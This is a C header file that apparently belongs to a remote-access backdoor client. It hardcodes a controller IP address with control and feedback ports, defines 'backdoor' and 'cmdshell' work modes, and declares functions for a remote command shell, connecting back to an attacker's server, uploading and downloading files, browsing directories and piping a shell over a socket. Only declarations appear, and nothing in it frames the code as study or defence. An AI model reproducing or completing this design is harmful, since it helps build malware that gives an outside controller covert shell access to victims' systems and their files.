#ifndef _REFECT_H_
#define _REFECT_H_

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/errno.h>
#include <pthread.h>
#include <semaphore.h>
#include <sys/stat.h>
#include <dirent.h>
#include <time.h>
#include <linux/tcp.h>


#define IP "192.168.1.106"   //控制IP
#define COM_PORT "8080"  //服务端口
#define RES_PORT "8081"  //反馈端口

#define NAME_LEN 255
#define BUF_SIZE 2048
#define WORK_BACKDOOR 1
#define WORK_CMDSHELL 2


struct client_cfg
{
	int timeout;
	short port;
	short res_port;
	char server_IP[NAME_LEN];
	
};

struct headbead_arg
{
	struct client_cfg *cfg;
	int sockfd;
	pthread_mutex_t sendbuf_mutex;
};

int headbeat_shutdown;
int wait_stat;
int handle(int sockfd, char *buf, int size);
int cmdshell_mod(char *cmd);
int connect_server(short port);
int backdoor_mod(char *ip, short port);
int upload_mod(char *filename, int filesize);
int download_mod(char *filename);
int explorer_mod(char *path);

int shell2_mod(void);
int execl_shell(int infd, int outfd);
int io2shell(int infd, int outfd, int sockfd);

#endif
